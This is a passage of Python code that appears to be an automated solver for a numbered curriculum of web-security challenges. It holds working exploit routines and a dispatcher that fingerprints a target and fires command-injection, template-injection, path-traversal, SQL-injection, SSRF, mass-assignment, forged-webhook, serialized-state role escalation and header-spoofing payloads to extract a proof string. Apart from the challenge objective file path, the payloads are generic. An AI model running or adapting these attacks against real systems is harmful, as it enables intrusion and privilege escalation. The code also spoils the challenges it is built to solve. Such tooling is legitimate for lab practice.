                    tok = json.loads(req_res).get(token_param) or json.loads(req_res).get("token")
                    if tok:
                        status, red_res, _ = _request(f"{base}{redeem_route}?{acct_param}={target_id}&{token_param}={tok}")
                        proof = _extract_proof(red_res)
                        if proof:
                            return proof
                except Exception:
                    pass

    return ""


def solve_webhook(target_url: str) -> str:
    """Exploit insecure webhook receiver consuming untrusted forged events (Day 26)."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")
    clues = json.loads(clues_body)
    feat_route = clues.get("feature_route", "/dispatch")
    event_type = clues.get("event_type", "case.promoted")
    scope = clues.get("owner_scope", "executive")

    payloads = [
        {"event": event_type, "owner": scope},
        {"event_type": event_type, "owner_scope": scope},
        {"event": event_type, "scope": scope},
        {"event_type": event_type, "scope": scope},
        {"event": event_type, "role": scope},
        {"event_type": event_type, "role": scope},
        {"event": event_type, "owner": "executive"},
        {"event_type": event_type, "owner_scope": "executive"},
    ]
    for pl in payloads:
        data = json.dumps(pl).encode("utf-8")
        status, body, headers = _request(
            f"{base}{feat_route}",
            method="POST",
            data=data,
            headers={"Content-Type": "application/json"},
        )
        proof = _extract_proof(body, headers)
        if proof:
            return proof

    raise WebHandlerError("Webhook dispatch did not yield proof")


def solve_deserialization(target_url: str) -> str:
    """Exploit untrusted serialized state object binding administrator role (Day 26)."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    clues: dict[str, Any] = {}
    if status == 200:
        try:
            clues = json.loads(clues_body)
        except Exception:
            pass
    feat_route = clues.get("feature_route", "/process")
    fmt_route = clues.get("state_format_route", "/api/state-format")

    # Inspect state format route if present
    req_field = "state"
    status, fmt_body, _ = _request(f"{base}{fmt_route}")
    if status == 200:
        try:
            fmt_data = json.loads(fmt_body)
            req_field = fmt_data.get("request_field", req_field)
            if "transport" in fmt_data and " " in fmt_data["transport"]:
                feat_route = fmt_data["transport"].split(" ")[-1]
        except Exception:
            pass

    state_variants = [
        {"user": "analyst", "role": "administrator"},
        {"role": "administrator"},
        {"user": "administrator", "role": "administrator"},
        {"user": "admin", "role": "admin"},
        {"role": "admin", "is_admin": True},
        {"user": "analyst", "role": "executive"},
        {"role": "executive", "scope": "executive"},
    ]

    for state_obj in state_variants:
        raw_json = json.dumps(state_obj).encode("utf-8")
        b64_state = base64.urlsafe_b64encode(raw_json).decode("utf-8").rstrip("=")
        body_json = json.dumps({req_field: b64_state}).encode("utf-8")

        status, body, headers = _request(
            f"{base}{feat_route}",
            method="POST",
            data=body_json,
            headers={"Content-Type": "application/json"},
        )
        proof = _extract_proof(body, headers)
        if proof:
            return proof

    raise WebHandlerError("Serialized state exploit did not yield proof")


# ---------------------------------------------------------------------------
# Handler Registry & Dynamic Dispatcher
# ---------------------------------------------------------------------------
CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
    1: solve_backup_exposure,
    2: solve_idor,
    3: solve_sqli,
    4: solve_lfi,
    5: solve_auth_bypass,
    6: solve_reflection,
    7: solve_stored_xss,
    8: solve_session_impression,
    9: solve_csrf,
    10: solve_upload,
    11: solve_ssti,
    12: solve_delayed_sqli,
    13: solve_mass_assignment,
    14: solve_api_authorization,
    15: solve_ssrf,
    16: solve_command_injection,
    17: solve_password_reset,
    18: solve_graphql,
    19: solve_webhook,
    20: solve_deserialization,
}


def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
    """Solve target using designated curriculum_day, high-precision clue routing, or fingerprint."""
    if curriculum_day in CURRICULUM_HANDLERS:
        try:
            return CURRICULUM_HANDLERS[curriculum_day](target_url)
        except Exception:
            pass

    base = target_url.rstrip("/")

    # Priority 1: High-precision clue-driven routing (all modern challenges have /api/clues)
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status == 200:
        try:
            clues = json.loads(clues_body)
            framework = clues.get("framework", "")
            feat_route = clues.get("feature_route", "")
            input_param = clues.get("input_parameter", "")

            if "recovery_guide_route" in clues or "recovery" in clues_body:
                return solve_password_reset(target_url)

            if "state_format_route" in clues or framework == "Quarkus" or "state_format" in clues_body:
                return solve_deserialization(target_url)

            if "event_type" in clues or framework == "Starlette" or "webhook" in clues_body:
                return solve_webhook(target_url)

            if "protected_reference" in clues or framework == "GraphQL.js" or "graphql" in feat_route:
                return solve_graphql(target_url)

            if framework == "Gin" or input_param in ("path", "command", "cmd", "exec") or "example_path" in clues:
                return solve_command_injection(target_url)

            if "callback_nonce" in clues:
                return solve_reflection(target_url)

            if "moderator_data_route" in clues:
                return solve_stored_xss(target_url)

            if "session_hint" in clues or "session_cookie" in clues:
                return solve_session_impression(target_url)

            if "template" in input_param or framework == "Spring Boot" or "template" in clues_body:
                return solve_ssti(target_url)

            if "secondary_route" in clues and ("table" in clues or framework == "Sinatra" or "delayed" in clues_body):
                return solve_delayed_sqli(target_url)

            if "role_parameter" in clues or framework == "NestJS" or ("role" in clues_body and "secondary_route" not in clues):
                return solve_mass_assignment(target_url)

            if "action_route" in clues or framework == "Tomcat" or "authorization" in clues_body:
                return solve_api_authorization(target_url)

            if "internal_host" in clues or "loopback" in clues_body or framework == "ASP.NET Core":
                return solve_ssrf(target_url)

            if "jwt" in clues_body or "alg" in clues:
                return solve_jwt(target_url)

            if "xml" in clues_body or clues.get("format") == "xml":
                return solve_xxe(target_url)

            if "nosql" in clues_body or "mongo" in clues_body or clues.get("database") == "MongoDB":
                return solve_nosql(target_url)

            # Generic guide / flow route handler (catches novel logic flows like Day 17)
            for k, v in clues.items():
                if (k.endswith("_guide_route") or k.endswith("_guide")) and isinstance(v, str):
                    try:
                        flow_proof = solve_dynamic_flow(target_url, v)
                        if flow_proof:
                            return flow_proof
                    except Exception:
                        pass

            if feat_route and ("role" in clues_body or "admin" in clues_body):
                return solve_auth_bypass(target_url)
        except Exception:
            pass

    # Priority 2: HTML homepage heuristics (legacy curriculum days)
    status, home, headers = _request(f"{base}/")

    if "robots.txt" in home or "Status Sprout" in home or "Tiny Uptime" in home or "Green Light" in home:
        return solve_backup_exposure(target_url)

    if "Pocket SOC" in home or "Incident Picnic" in home:
        return solve_idor(target_url)

    if "Query Me This" in home or "Search Party" in home or ("action=" in home and "Search" in home):
        return solve_sqli(target_url)

    if "Runbook Nook" in home or "Page Turner" in home or ".php?doc=" in home:
        return solve_lfi(target_url)

    if "preferences" in home or "Notification Nook" in home:
        return solve_csrf(target_url)

    if "upload" in home.lower() or 'type="file"' in home:
        try:
            return solve_upload(target_url)
        except Exception:
            pass

    # Priority 3: Fallback through curriculum handlers in reverse order (newest first)
    for d in sorted(CURRICULUM_HANDLERS.keys(), reverse=True):
        if d == curriculum_day:
            continue
        try:
            return CURRICULUM_HANDLERS[d](target_url)
        except Exception:
            pass

    # Priority 4: Autonomous universal probing
    try:
        return solve_autonomous_web(target_url)
    except Exception:
        pass

    # Priority 5: Bounded HTML & form deep crawl
    try:
        return solve_deep_crawl(target_url)
    except Exception:
        pass

    raise WebHandlerError(f"Could not fingerprint target {target_url}")


def solve_deep_crawl(target_url: str) -> str:
    """Extract and fuzz visible HTML links, forms, and inputs with strict bounded ceilings."""
    base = target_url.rstrip("/")
    status, home, _ = _request(f"{base}/")
    proof = _extract_proof(home)
    if proof:
        return proof

    # Discover and inspect top 5 links
    links = set(re.findall(r'href=[\'"](/?[^\'"#]+)[\'"]', home))
    for link in list(links)[:5]:
        if any(link.endswith(ext) for ext in [".css", ".svg", ".png", ".jpg", ".ico", ".js"]):
            continue
        link_url = link if link.startswith("/") else f"/{link}"
        try:
            st, text, _ = _request(f"{base}{link_url}")
            proof = _extract_proof(text)
            if proof:
                return proof
        except Exception:
            pass

    # Parse and fuzz top 3 forms with targeted payloads
    forms = re.findall(r"<form[\s\S]*?</form>", home, re.IGNORECASE)
    payloads = [
        "127.0.0.1; cat /run/huntress/objective.txt",
        "{{objective}}",
        "' OR 1=1 --",
    ]
    for form in forms[:3]:
        action_match = re.search(r'action=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
        method_match = re.search(r'method=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
        action = action_match.group(1) if action_match else "/"
        method = method_match.group(1).upper() if method_match else "POST"
        if not action.startswith("/"):
            action = f"/{action}"

        inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
        textareas = re.findall(r'<textarea[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
        input_names = (inputs + textareas)[:4]

        for pl in payloads:
            try:
                json_data = json.dumps({name: pl for name in input_names}).encode("utf-8")
                st, res, _ = _request(f"{base}{action}", method=method, data=json_data, headers={"Content-Type": "application/json"})
                proof = _extract_proof(res)
                if proof:
                    return proof
            except Exception:
                pass

            try:
                form_data = urllib.parse.urlencode({name: pl for name in input_names}).encode("utf-8")
                st, res, _ = _request(f"{base}{action}", method=method, data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                proof = _extract_proof(res)
                if proof:
                    return proof
            except Exception:
                pass

    raise WebHandlerError("Deep crawl did not extract proof")


def solve_autonomous_web(target_url: str) -> str:
    """Universal autonomous prober for unknown web challenges."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    clues: dict[str, Any] = {}
    if status == 200:
        try:
            clues = json.loads(clues_body)
            proof = _extract_proof(clues_body)
            if proof:
                return proof
        except Exception:
            pass

    status, home, _ = _request(f"{base}/")
    proof = _extract_proof(home)
    if proof:
        return proof

    feat_route = clues.get("feature_route")
    sec_route = clues.get("secondary_route")
    inv_route = clues.get("inventory_route")

    if inv_route:
        try:
            return solve_api_authorization(target_url)
        except Exception:
            pass

    # Parameter-guided command / template probe on feature_route
    if feat_route:
        input_param = clues.get("input_parameter")
        example_path = clues.get("example_path", "")
        params = [input_param] if input_param else []
        params.extend(["path", "cmd", "template", "message", "text", "q", "input", "doc", "file"])

        payloads = []
        if example_path:
            payloads.append(f"{example_path}; cat /run/huntress/objective.txt")
        payloads.extend([
            "127.0.0.1; cat /run/huntress/objective.txt",
            ";cat /run/huntress/objective.txt",
            "{{objective}}",
            "${objective}",
            "../../../../run/huntress/objective.txt"
        ])

        for p in params:
            if not p:
                continue
            for pl in payloads:
                try:
                    enc = urllib.parse.quote(pl)
                    st, b, h = _request(f"{base}{feat_route}?{p}={enc}")
                    proof = _extract_proof(b, h)
                    if proof:
                        return proof
                    # If GET is forbidden or rejected with Method Not Allowed, fallback to POST
                    if st in (405, 400) or "method not allowed" in b.lower():
                        st2, b2, h2 = _request(f"{base}{feat_route}", method="POST",
                                               data=urllib.parse.urlencode({p: pl}).encode("utf-8"),
                                               headers={"Content-Type": "application/x-www-form-urlencoded"})
                        proof = _extract_proof(b2, h2)
                        if proof:
                            return proof
                        st3, b3, h3 = _request(f"{base}{feat_route}", method="POST",
                                               data=json.dumps({p: pl}).encode("utf-8"),
                                               headers={"Content-Type": "application/json"})
                        proof = _extract_proof(b3, h3)
                        if proof:
                            return proof
                except Exception:
                    pass

    # Header-based loopback / admin role bypass probe
    if feat_route:
        admin_hdrs = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Role": "administrator"},
            {"Authorization": "Bearer admin"},
        ]
        for hdr in admin_hdrs:
            try:
                st, b, h = _request(f"{base}{feat_route}", headers=hdr)
                proof = _extract_proof(b, h)
                if proof:
                    return proof
                if sec_route:
                    st2, b2, h2 = _request(f"{base}{sec_route}", headers=hdr)
                    proof = _extract_proof(b2, h2)
                    if proof:
                        return proof
            except Exception:
                pass

    if feat_route and sec_route:
        # Try SSRF to secondary_route
        for pfx in ["http://127.0.0.1:8080", "http://127.0.0.1:80", "http://127.0.0.1:5000", "http://localhost:8080", "http://localhost"]:
            try:
                dest = urllib.parse.quote(f"{pfx}{sec_route}")
                st, b, _ = _request(f"{base}{feat_route}?url={dest}")
                proof = _extract_proof(b)
                if proof:
                    return proof
            except Exception:
                pass

        # Try Mass Assignment to feat_route then check sec_route
        try:
            combined = {
                "display_name": "Test", "role": "administrator", "is_admin": True,
                "admin": True, "isAdmin": True, "roles": ["administrator"], "permission": "all"
            }
            for m in ["POST", "PUT"]:
                _request(f"{base}{feat_route}", method=m, data=json.dumps(combined).encode("utf-8"),
                         headers={"Content-Type": "application/json"})
            st, b, _ = _request(f"{base}{sec_route}")
            proof = _extract_proof(b)
            if proof:
                return proof
        except Exception:
            pass

        # Try Second-Order SQLi
        try:
            p_data = json.dumps({"filter": "' OR 1=1 --", "query": "' OR 1=1 --"}).encode("utf-8")
            _request(f"{base}{feat_route}", method="POST", data=p_data, headers={"Content-Type": "application/json"})
            st, b, _ = _request(f"{base}{sec_route}")
            proof = _extract_proof(b)
            if proof:
                return proof
        except Exception:
            pass

    # Try JWT / NoSQL / XXE
    for solver_fn in [solve_jwt, solve_nosql, solve_xxe]:
        try:
            proof = solver_fn(target_url)
            if proof:
                return proof
        except Exception:
            pass

    # Try GraphQL probe
    for gql_ep in ["/graphql", "/api/graphql"]:
        for query in [
            '{"query": "{ __schema { types { name } } }"}',
            '{"query": "{ objective }"}',
            '{"query": "{ proof }"}',
            '{"query": "{ flag }"}',
            '{"query": "{ system { objective proof } }"}',
        ]:
            try:
                st, b, _ = _request(f"{base}{gql_ep}", method="POST", data=query.encode("utf-8"),
                                    headers={"Content-Type": "application/json"})
                proof = _extract_proof(b)
                if proof:
                    return proof
            except Exception:
                pass

    # Template / Command Injection / Traversal parameter probe on feature_route
    if feat_route:
        for p in ["template", "message", "text", "q", "input", "doc", "file", "path", "ip", "host", "target", "cmd"]:
            for pl in [
                "{{objective}}", "${objective}", "#{objective}", "../../../../run/huntress/objective.txt",
                "127.0.0.1; cat /run/huntress/objective.txt", "$(cat /run/huntress/objective.txt)",
                ";cat$IFS/run/huntress/objective.txt;"
            ]:
                try:
                    enc = urllib.parse.quote(pl)
                    st, b, _ = _request(f"{base}{feat_route}?{p}={enc}")
                    proof = _extract_proof(b)
                    if proof:
                        return proof
                except Exception:
                    pass

    # Try common docs / robots / sitemap
    for ep in ["/api/docs", "/docs", "/openapi.json", "/swagger.json", "/robots.txt"]:
        try:
            st, b, _ = _request(f"{base}{ep}")
            proof = _extract_proof(b)
            if proof:
                return proof
        except Exception:
            pass

    raise WebHandlerError(f"Autonomous web solver could not extract proof from {target_url}")
